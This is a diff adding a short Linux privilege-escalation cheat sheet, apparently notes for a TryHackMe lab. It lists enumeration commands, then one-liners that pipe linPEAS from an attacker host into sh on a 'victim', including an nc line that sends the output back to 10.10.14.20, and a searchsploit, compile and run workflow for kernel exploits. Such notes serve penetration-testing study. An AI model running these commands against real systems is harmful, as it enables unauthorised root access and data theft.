@@ -1,0 +1,89 @@
+Linux Privilege Escalation:
+
+Enumeration:::
+
+hostname
+uname -a
+cat /proc/version
+cat /etc/issue
+ps
+ps -a
+ps -axjf
+ps aux
+env
+sudo -l
+ls
+ls -la
+ls -a
+id
+cat /etc/passwd
+cat /etc/passwd | cut -d ":" -f 1
+cat /etc/passwd | grep home
+cat /etc/passwd | grep /bin/bash
+ifonfig
+ip route
+netstat
+netstat -l
+netstat -ano
+
+find . -name flag1.txt
+find /home -name flag1.txt
+find / -type d -name config
+
+Automated Tools:::
+
+https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+https://tryhackme.com/r/room/linprivesc
+https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/linted/linuxprivchecker
+
+# From public github
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+# Without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+# Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+
+# Output to file
+./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
+less -r /dev/shm/linpeas.txt #Read with colors
+
+# Use a linpeas binary
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+chmod +x linpeas_linux_amd64
+./linpeas_linux_amd64
+
+# First, a couple of useful oneliners ;)
+wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
+curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo lse.sh;chmod 700 lse.sh
+
+Kernel Exploit::
+
+uname -a
+searchspoloit linux kernel X.XX
+searchspoloit -m path
+
+python -m http.server 12345
+wget http://127.0.0.1:12345/file
+
+gcc exploit.c -o exploit
+ls
+./exploit
+
+id
+
+Sudo Exploitats::: https://gtfobins.github.io
+
+
+
+
+
+
